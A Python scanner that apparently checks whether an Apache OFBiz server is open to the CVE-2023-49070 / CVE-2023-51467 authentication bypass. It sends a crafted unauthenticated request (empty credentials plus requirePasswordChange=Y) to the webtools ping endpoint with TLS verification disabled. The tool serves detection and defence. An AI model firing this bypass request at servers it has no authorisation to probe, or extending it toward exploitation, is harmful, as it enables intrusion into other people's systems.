import argparse
import requests
import urllib3

# Disable SSL verification warning for simplicity
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def validate_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        raise ValueError("Invalid URL schema. Use 'http://' or 'https://'.")

def scan(url):
    print("[+] Scanning started...")
    try:
        target_url = f"{url}/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        response = requests.get(target_url, verify=False)

        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)

        if "PONG" in response.text:
            print("[+] Apache OFBiz instance seems to be vulnerable.")
        else:
            print("[-] Apache OFBiz instance seems NOT to be vulnerable.")

    except requests.exceptions.RequestException as e:
        print(f"[-] LOG: An error occurred during the scan: {e}")

def main():
    parser = argparse.ArgumentParser(description="Detection script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).")
    parser.add_argument("--url", required=True, help="EFBIZ's URL to send requests to.")
    args = parser.parse_args()

    url = args.url.rstrip('/')
    validate_url(args.url)

    scan(url)

if __name__ == "__main__":
    main()
